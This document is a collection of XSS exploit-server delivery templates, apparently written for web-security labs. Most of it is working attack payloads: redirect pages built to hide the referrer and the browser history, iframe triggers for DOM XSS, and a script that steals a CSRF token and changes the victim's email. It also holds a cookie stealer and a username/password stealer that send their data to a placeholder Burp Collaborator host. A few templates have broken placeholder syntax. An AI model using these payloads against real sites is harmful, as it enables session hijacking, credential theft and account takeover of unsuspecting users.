# XSS exploit-server delivery templates
#
# Purpose: When the vulnerable app requires the victim to be navigated to a URL
# that carries your final XSS payload (e.g., reflected into HTML/attribute),
# host one of these minimal pages on the exploit server to deliver it.
#
# Placeholders (replace before use):
# - {{TARGET_URL}}      : Absolute URL to the vulnerable endpoint (no querystring)
# - {{PARAM}}           : Query parameter name receiving the payload
# - {{ENC_PAYLOAD}}     : URL-encoded payload string suitable for the target context
# - {{FRAGMENT}}        : Optional fragment part, e.g. "#x" for focus tricks (or empty)
#
# Notes:
# - Prefer variants that set referrer policy to avoid leaking victim URLs in Referer.
# - Use window.location.replace(...) to avoid leaving the exploit page in history.
# - For custom-tag/focus techniques, include a fragment like "#x" to auto-focus.
# - If CSP or meta refresh is blocked, fall back to a plain <script> redirect.

<meta name="referrer" content="no-referrer"><script>location.replace('{{TARGET_URL}}?{{PARAM}}={{ENC_PAYLOAD}}{{FRAGMENT}}');</script>

<meta name="referrer" content="no-referrer"><script>top.location.replace('{{TARGET_URL}}?{{PARAM}}={{ENC_PAYLOAD}}{{FRAGMENT}}');</script>

<meta name="referrer" content="no-referrer"><meta http-equiv="refresh" content="0;url={{TARGET_URL}}?{{PARAM}}={{ENC_PAYLOAD}}{{FRAGMENT}}">

<a id=a href="{{TARGET_URL}}?{{PARAM}}={{ENC_PAYLOAD}}{{FRAGMENT}}" rel="noreferrer noopener">x</a><script>document.getElementById('a').click()</script>

<script>location='{{TARGET_URL}}?{{PARAM}}={{ENC_PAYLOAD}}{{FRAGMENT}}'</script>

# data URL variant (paste as a single URL when only a link is allowed)
data:text/html,<meta%20name%3D"referrer"%20content%3D"no-referrer"><script>location.replace('{{TARGET_URL}}?{{PARAM}}={{ENC_PAYLOAD}}{{FRAGMENT}}')</script>

# iframe focus helper (keeps a clean history entry in some browsers)
<meta name="referrer" content="no-referrer"><iframe src="{{TARGET_URL}}?{{PARAM}}={{ENC_PAYLOAD}}{{FRAGMENT}}" style="display:none" referrerpolicy="no-referrer"></iframe>

# iframe with resize
<iframe src="{{URL}}/?search="{{PAYLOAD}}" onload=this.style.width='100px'>

# iframe onload action for DOM vulns with onerror print payload.
<iframe src="{{URL}}" onload="this.src+='<img src=x onerror=print()>'"></iframe>

# script delivery of onfocus event which doesn't propogate through cross-origin iframes
<script>
location = '{{URL}}/?search={{%3C{{TAG}}+id%3Dx+onfocus%3D{{PAYLOAD}}%29%}}20tabindex=1%3E#x';
</script>

# Cookie stealer via Burp Collaborator
<script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
</script>

# CSRF + XSS modification payload - ORIGINAL_PATH is required to get the CSRF token, ACTION_PATH is the actual change action path. 
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/{{ORIGINAL_PATH}}',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '{{ACTION_PATH}}', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

# Steal username and password with Bupr Collaborator
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

# Fragment-focus example for custom tags: set {{FRAGMENT}} to "#x"
# Example final URL piece: ?{{PARAM}}={{ENC_PAYLOAD}}#x


